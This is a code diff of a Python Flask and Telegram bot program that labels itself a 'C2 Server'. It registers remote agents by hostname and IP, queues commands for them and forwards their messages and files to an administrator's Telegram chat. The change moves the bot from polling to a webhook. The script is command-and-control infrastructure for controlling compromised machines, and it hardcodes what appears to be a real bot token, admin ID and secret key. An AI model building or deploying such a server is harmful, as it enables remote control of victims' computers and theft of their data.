@@ -6,25 +6,27 @@
 import os, json, time, base64, threading, logging
 from flask import Flask, request, jsonify
 import telebot
-from telebot import apihelper
+from telebot import apihelper, types
 
 # === НАСТРОЙКИ (задайте через переменные окружения или прямо здесь) ===
 TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "6099860667"))
 SECRET_KEY = os.environ.get("SECRET_KEY", "R0T-K1T")
-PROXY = os.environ.get("PROXY", "")  # например socks5://user:pass@host:port
-WEBHOOK_URL = os.getenv('DOMAIN', 'https://default.bothost.tech')  # публичный URL вашего скрипта
 
-# === ПРОКСИ ===
-if PROXY:
-    apihelper.proxy = {'https': PROXY, 'http': PROXY}
+# === ДОМЕН ВАШЕГО СЕРВЕРА (тот, на котором вы видели 404) ===
+# Замените на ваш реальный домен, который вы получили от BotHost
+# Например: "https://bot-123456.bothost.tech"
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://bot-1786635592_9600_swagg3r.bothost.tech")
 
+# === СОЗДАНИЕ БОТА И FLASK ===
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
+# Хранилища
 agents = {}
 commands_queue = {}
 
+# === ФУНКЦИЯ ОТПРАВКИ СООБЩЕНИЙ АДМИНУ ===
 def send_to_admin(text, file=None):
     try:
         if file:
@@ -32,8 +34,9 @@ def send_to_admin(text, file=None):
         else:
             bot.send_message(ADMIN_ID, text)
     except Exception as e:
-        print(f"Ошибка отправки: {e}")
+        print(f"Ошибка отправки в Telegram: {e}")
 
+# === ЭНДПОИНТЫ ДЛЯ АГЕНТОВ ===
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
@@ -48,7 +51,7 @@ def register():
         "ip": data.get("ip", "?"),
         "last_seen": time.time()
     }
-    send_to_admin(f"🆕 Агент: {agent_id} ({agents[agent_id]['hostname']})")
+    send_to_admin(f"🆕 Агент зарегистрирован: {agent_id} ({agents[agent_id]['hostname']})")
     return jsonify({"status": "ok"})
 
 @app.route('/send_message', methods=['POST'])
@@ -105,13 +108,34 @@ def add_command():
     commands_queue[agent_id].append(command)
     return jsonify({"status": "ok"})
 
-# === ЗАПУСК БОТА (Webhook или polling) ===
-if __name__ == '__main__':
-    if WEBHOOK_URL:
-        bot.remove_webhook()
-        bot.set_webhook(url=WEBHOOK_URL)
-        print(f"Webhook установлен: {WEBHOOK_URL}")
+# === ЭНДПОИНТ ДЛЯ ВЕБХУКА TELEGRAM ===
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return '', 200
     else:
-        print("Использую polling (но может не работать без прокси)")
+        return '', 403
+
+# === КОРНЕВОЙ ПУТЬ (для проверки) ===
+@app.route('/')
+def index():
+    return "C2 Server is running. Webhook URL: " + WEBHOOK_URL, 200
+
+# === ЗАПУСК ===
+if __name__ == '__main__':
+    # Устанавливаем вебхук
+    try:
+        bot.remove_webhook()
+        bot.set_webhook(url=WEBHOOK_URL + '/webhook')
+        print(f"✅ Webhook установлен: {WEBHOOK_URL}/webhook")
+    except Exception as e:
+        print(f"⚠️ Ошибка установки вебхука: {e}")
+        print("Переключаюсь на polling (может не работать)")
         threading.Thread(target=bot.polling, kwargs={'none_stop': True}, daemon=True).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))
+
+    # Запускаем Flask-сервер
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
